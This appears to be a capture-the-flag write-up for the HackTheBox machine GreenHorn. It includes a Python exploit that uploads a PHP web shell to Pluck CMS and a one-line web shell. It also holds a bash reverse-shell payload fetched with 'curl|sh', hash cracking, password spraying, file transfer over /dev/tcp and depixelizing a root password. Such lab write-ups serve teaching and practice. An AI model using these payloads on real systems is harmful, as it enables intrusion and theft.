---
render_with_liquid: false
title: HackTheBox Writeup  GreenHorn
date: 2024-07-21 16:07:12 +1400
tags: [hackthebox, nmap, linux, gitea, information-disclosure, discover-secrets, haiti, hashcat, pluck-cms, cms, php, file-upload, password-spraying, pdf, pdfimages, depixelization, depix]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ pt init '10.129.48.17 greenhorn.htb'
+-----------+--------+--------------+---------------+
|  PROFILE  | STATUS |      IP      |    DOMAIN     |
+-----------+--------+--------------+---------------+
| greenhorn | on     | 10.129.48.17 | greenhorn.htb |
+-----------+--------+--------------+---------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Jul 21 16:07:12 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,3000, 10.129.48.17
Nmap scan report for 10.129.48.17
Host is up, received user-set (0.28s latency).
Scanned at 2024-07-21 16:07:12 CST for 318s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=13f3fc2f350e5ee5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=zPvIzX0c9a0VonOX1BO2iaz-GKI6MTcyMTU0OTI0MTM5NTM2NTEwOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 21 Jul 2024 08:07:21 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=197b975493476dcd; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=gxiYdAZNj_PrVrhc70QnoJWc02o6MTcyMTU0OTI0Nzg3MDcxMTgwNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 21 Jul 2024 08:07:27 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=9%D=7/21%Time=669CC1B7%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2A60,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=13f3fc2f350e5ee5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=zPvIzX0c9a0VonOX1BO2iaz-GKI6MTcyMTU0OTI0MTM5NTM2NTEwOQ;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2021\x20Jul\x202024\x2008:07:21\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=197b975493476dcd;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=gxiYdAZNj_PrVrhc70QnoJWc02o6MTcyM
SF:TU0OTI0Nzg3MDcxMTgwNw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2021\x20J
SF:ul\x202024\x2008:07:27\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jul 21 16:12:30 2024 -- 1 IP address (1 host up) scanned in 318.74 seconds
```

## 80 - HTTP : GreenHorn / Pluck CMS 4.7.18 


### Info

```ruby
http://greenhorn.htb [302,200] [Welcome to GreenHorn ! - GreenHorn] [nginx/1.18.0 (Ubuntu)] [http://greenhorn.htb/?file=welcome-to-greenhorn] [feac055eaa0521f9ca1fa2f02d332b308557d89f] [Nginx:1.18.0,PHP,Ubuntu]
```

![](/assets/obsidian/ab980be57f701758e63239d75774b040.png)

## 3000 - HTTP : Gitea 1.21.11


### Info

```ruby
http://greenhorn.htb:3000 [200] [GreenHorn] [] [0a6fe25eb685d27affb0124e3cb0baf6a5a94822] [Gitea,Go]
```

![](/assets/obsidian/9beb6119aa2e558df281e8c5553be913.png)

# User Flag
---

## Shell as www-data


### 3000 - Gitea : Pluck CMS config file exposure

> http://10.129.48.17:3000/explore/repos

- 1 public repo

![](/assets/obsidian/9c732f0eb73e42996a0b4577d15054ba.png)

- Identified `pluck cms` from `README.md`

![](/assets/obsidian/985cb1e0226345c700700f2c13ce6c14.png)

> http://10.129.48.17:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php

- Found admin's password hash

![](/assets/obsidian/3b87d0fab2ba11ab0853d4996d11fed7.png)

### Crack the hash

Check hash type

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ echo d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163 > loot/pluck.hash

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ cat loot/pluck.hash | haiti -
SHA-512 [HC: 1700] [JtR: raw-sha512]
SHA3-512 [HC: 17600] [JtR: raw-sha3]
SHA3-512 [HC: 17600] [JtR: dynamic_400]
Keccak-512 [HC: 18000] [JtR: raw-keccak]
BLAKE2-512 (blake2b) [JtR: raw-blake2]
Whirlpool [HC: 6100] [JtR: whirlpool]
Salsa10
Salsa20
Skein-512 [JtR: skein-512]
MD6-512
Shake-128 (512)
Shake-256 (512)
Shake-512 (512)
Streebog-512
IPMI 2.0 RAKP HMAC-SHA1 [HC: 7300]
Umbraco HMAC-SHA1 [HC: 24800]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ hashcat loot/pluck.hash /opt/wordlists/rockyou.txt -m 1700
[...]

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ hashcat loot/pluck.hash /opt/wordlists/rockyou.txt -m 1700 --show
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
```

### 80 - Pluck CMS : RCE

- Google : `pluck 4.7.18 exploit`

> POC (Not working) - https://www.exploit-db.com/exploits/51592

Since the POC doesn't work properly, I wrote a fixed version ([Github link](https://github.com/opabravo/pluck-cms-rce))

> `exploit.py`

```python
import os, sys, shutil
import random, string
import argparse
import tempfile
import requests
import time


session = requests.Session()
EPILOG_TXT='''
Example : python exploit.py -u http://pluck.local -p 'anti_sysadmin' -f phpinfo.php
'''


def gen_string():
    """Generate a random none-repeating string"""
    return ''.join(random.choices(string.ascii_lowercase, k=8))


def login(base_url: str, password: str):
    print('[*] Logging in')
    url = f'{base_url}/login.php'
    response = session.get(url)
    data = {
        'cont1': password,
        'bogus': '',
        'submit': 'Login in',
    }
    response = session.post(url, data=data)
    if 'Password incorrect' in response.text:
        print('[-] Failed to login')
        sys.exit(1)
    return response.text


def upload_module(base_url: str, php_fp: str):
    print('[*] Uploading module')
    url = f'{base_url}/admin.php?action=installmodule'
    headers = {
        'Referer': f'{base_url}/admin.php?action=start',
    }
    headers.update(session.headers)
    zip_fp = tempfile.NamedTemporaryFile(suffix='.zip').name
    with tempfile.TemporaryDirectory() as tmp_dir:
        shutil.copy(php_fp, f'{tmp_dir}/x.php')
        shutil.make_archive(zip_fp[:-4], 'zip', tmp_dir)
    module_name = gen_string()
    files = {
        'sendfile': (f'{module_name}.zip', open(f'{zip_fp}', 'rb'), 'application/zip'),
        'submit': (None, 'Upload'),
    }
    response = session.post(url, files=files, headers=headers)
    os.remove(zip_fp)
    if 'The module has been installed successfully' not in response.text:
        print('[-] Failed to upload module')
        sys.exit(1)
    return f'{base_url}/data/modules/{module_name}/x.php'


def get_args():
    parser = argparse.ArgumentParser(description='Pluck CMS module install to RCE (Authenticated)', formatter_class=argparse.RawTextHelpFormatter, epilog=EPILOG_TXT)
    parser.add_argument('-u', help='Base URL', required=True)
    parser.add_argument('-p', help='Password', required=True)
    parser.add_argument('-f', help='PHP web shell path', required=True)
    return parser.parse_args()


if __name__ == '__main__':
    args = get_args()
    base_url = args.u
    password = args.p
    php_fp = args.f
    login(base_url, password)
    webshell_url = upload_module(base_url, php_fp)
    print(f'[+] Webshell uploaded to {webshell_url}')
```

Check if php file upload is successful and no `disable_functions` needs to bypass

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ echo '<?php phpinfo(); ?>' > phpinfo.php

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ python exploit.py -u http://greenhorn.htb -p iloveyou1 -f phpinfo.php
[*] Logging in
[*] Uploading module
[+] Webshell uploaded to http://greenhorn.htb/data/modules/rljchkxv/x.php

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ curl http://greenhorn.htb/data/modules/rljchkxv/x.php -s | grep disable_
<tr><td class="e">disable_classes</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">disable_functions</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
```

Upload a simple webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ echo '<?=`$_REQUEST[0]`;' > rce.php

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ python exploit.py -u http://greenhorn.htb -p iloveyou1 -f rce.php
[*] Logging in
[*] Uploading module
[+] Webshell uploaded to http://greenhorn.htb/data/modules/zidtetuw/x.php

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ curl http://greenhorn.htb/data/modules/zidtetuw/x.php --data-urlencode '0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Host reverse shell script on web server

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ mkdir -p www && cd www && echo "/bin/bash -c 'bash -i >& /dev/tcp/$(pt get lhost)/1111 0>&1'" > index.html && fuser -k 80/tcp 2>/dev/null; python -m http.server 80
  6234Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Invoke reverse shell on target machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/exploit]
└─$ curl http://greenhorn.htb/data/modules/zidtetuw/x.php --data-urlencode '0=curl 10.10.14.72|sh'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.72] from (UNKNOWN) [10.129.25.111] 42304
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck/data/modules/oclvfgln$ /usr/bin/script -qc /bin/bash /dev/null
<s/oclvfgln$ /usr/bin/script -qc /bin/bash /dev/null^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

                               www-data@greenhorn:~/html/pluck/data/modules/oclvfgln$ export TERM=xterm
www-data@greenhorn:~/html/pluck/data/modules/oclvfgln$ stty rows 50 columns 209
www-data@greenhorn:~/html/pluck/data/modules/oclvfgln$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to junior


### Situation awareness

- Mysql is running

```bash
www-data@greenhorn:~/html/pluck/data/modules/oclvfgln$ ss -ltnp
State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port            Process
LISTEN             0                  511                                  0.0.0.0:80                                0.0.0.0:*                users:(("nginx",pid=1026,fd=6),("nginx",pid=1025,fd=6))
LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*
LISTEN             0                  80                                 127.0.0.1:3306                              0.0.0.0:*
LISTEN             0                  4096                           127.0.0.53%lo:53                                0.0.0.0:*
LISTEN             0                  4096                                       *:3000                                    *:*
LISTEN             0                  128                                     [::]:22                                   [::]:*
```

- `junior` is the only normal user

```bash
www-data@greenhorn:~/html$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=114(git) gid=120(git) groups=120(git)
uid=1000(junior) gid=1000(junior) groups=1000(junior)
```

### Password spray

```bash
www-data@greenhorn:~/html$ PASS='iloveyou1'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 63604
[2] 63605
[3] 63606
www-data@greenhorn:~/html$ Password: Password: Password: [+] junior
```

```bash
www-data@greenhorn:~/html$ su - junior
Password:iloveyou1
junior@greenhorn:~$ id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
junior@greenhorn:~$ cat user.txt
64df2416fc2c710b183dcf80ca83ac8e
```

# Root Flag
---

## From junior to root


### PDF file containing pixelized root password

Find files and home folder but not owned by current user

```bash
junior@greenhorn:~$ find $HOME -type f \( -not -user $(id -u -n) -o -not -group $(id -g -n) \)  -exec ls -lahtr {} + 2>/dev/null
-rw-r----- 1 root junior 60K Jun 11 14:39 '/home/junior/Using OpenVAS.pdf'
-rw-r----- 1 root junior  33 Jul 21 12:44  /home/junior/user.txt
```

Transfer the abnormal file `Using OpenVAS.pdf` to attacker machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn]
└─$ nc -lvnp 443 > loot/'Using OpenVAS.pdf'
listening on [any] 443 ...
```

```bash
junior@greenhorn:~$ cat '/home/junior/Using OpenVAS.pdf' > /dev/tcp/10.10.14.72/443
```

> `Using OpenVAS.pdf`

![](/assets/obsidian/4574159b8f4c9dac748068687d984baf.png)

### Depixelize root password from image

> Q : How does **Depixelization** work?
> 
> A : For example, to recover pixelized credit card numbers from an image, you can generate all credit card numbers, pixelize them, and compare the result to the pixelized number
>  > [This article](https://www.spipm.nl/2030.html) explains Depixelization more in-depth
{: .prompt-info }

Extract the password image from PDF

```bash
┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/loot]
└─$ pdfimages -all Using\ OpenVAS.pdf output

┌──(bravosec㉿fsociety)-[~/htb/GreenHorn/loot]
└─$ ll output-000.png
Permissions Size User     Date Modified Name
.rw-r--r--   502 bravosec 23 Jul 07:13  output-000.png
```

Use **[Depix](https://github.com/spipm/Depix)** to recover the pixelized password from image

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/misc/Depix]
└─$ python depix.py -p /home/kali/htb/GreenHorn/loot/output-000.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png
2024-07-23 07:16:55,529 - Loading pixelated image from /home/kali/htb/GreenHorn/loot/output-000.png
2024-07-23 07:16:55,539 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-23 07:16:56,709 - Finding color rectangles from pixelated space
2024-07-23 07:16:56,712 - Found 252 same color rectangles
2024-07-23 07:16:56,712 - 190 rectangles left after moot filter
2024-07-23 07:16:56,712 - Found 1 different rectangle sizes
2024-07-23 07:16:56,712 - Finding matches in search image
2024-07-23 07:16:56,712 - Scanning 190 blocks with size (5, 5)
2024-07-23 07:16:56,782 - Scanning in searchImage: 0/1674
2024-07-23 07:18:51,030 - Removing blocks with no matches
2024-07-23 07:18:51,030 - Splitting single matches and multiple matches
2024-07-23 07:18:51,036 - [16 straight matches | 174 multiple matches]
2024-07-23 07:18:51,036 - Trying geometrical matches on single-match squares
2024-07-23 07:18:51,847 - [29 straight matches | 161 multiple matches]
2024-07-23 07:18:51,847 - Trying another pass on geometrical matches
2024-07-23 07:18:52,554 - [41 straight matches | 149 multiple matches]
2024-07-23 07:18:52,554 - Writing single match results to output
2024-07-23 07:18:52,555 - Writing average results for multiple matches to output
2024-07-23 07:18:57,789 - Saving output image to: output.png
```

> `output.png`

![](/assets/obsidian/988d153ac37e8830422017f6d0c225ed.png)

- Raw text : `sidefromsidetheothersidesidefromsidetheotherside`

### Switch user to root

```bash
junior@greenhorn:~$ su - root
Password:sidefromsidetheothersidesidefromsidetheotherside
root@greenhorn:~# id
uid=0(root) gid=0(root) groups=0(root)
root@greenhorn:~# cat root.txt
0878d9a2d4b1c78450d280eca8e1a19d
```

# Additional
---
